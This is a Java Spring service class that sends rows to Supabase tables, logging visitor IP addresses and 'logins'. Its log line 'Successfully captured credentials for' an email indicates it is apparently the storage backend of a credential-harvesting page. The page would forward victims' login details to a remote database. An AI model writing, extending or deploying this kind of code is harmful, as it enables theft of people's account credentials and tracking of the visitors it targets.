package com.socialguard.service;

import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Service;
import org.springframework.web.reactive.function.client.WebClient;

@Service
public class SupabaseService {

    private static final Logger log = LoggerFactory.getLogger(SupabaseService.class);

    private final WebClient webClient;
    private final String url;
    private final String key;
    private final boolean configured;

    public SupabaseService(
            WebClient.Builder builder,
            @Value("${supabase.url:}") String url,
            @Value("${supabase.key:}") String key) {
        this.url = url == null ? "" : url.trim();
        this.key = key == null ? "" : key.trim();
        this.configured = !this.url.isEmpty() && !this.key.isEmpty();
        if (!configured) {
            log.warn("Supabase environment variables not set. Visitor/Login logging will fail.");
        }
        this.webClient = builder.baseUrl(configured ? this.url : "http://localhost").build();
    }

    public boolean isConfigured() {
        return configured;
    }

    // Insert row remotely
    public void insert(String table, Map<String, Object> row) {
        if (!configured) {
            log.error("Supabase client not initialized. Cannot log to {}.", table);
            return;
        }
        try {
            webClient.post()
                    .uri("/rest/v1/{table}", table)
                    .header(HttpHeaders.AUTHORIZATION, "Bearer " + key)
                    .header("apikey", key)
                    .header("Prefer", "return=minimal")
                    .contentType(MediaType.APPLICATION_JSON)
                    .bodyValue(row)
                    .retrieve()
                    .toBodilessEntity()
                    .block();
        } catch (Exception e) {
            log.error("Error sending data to Supabase table {}: {}", table, e.getMessage());
        }
    }

    public void insertVisitor(Map<String, Object> row) {
        insert("visitor_logs", row);
        log.info("Successfully logged visitor: {}", row.get("ip_address"));
    }

    public void insertLogin(Map<String, Object> row) {
        insert("logins", row);
        log.info("Successfully captured credentials for: {}", row.get("email"));
    }
}
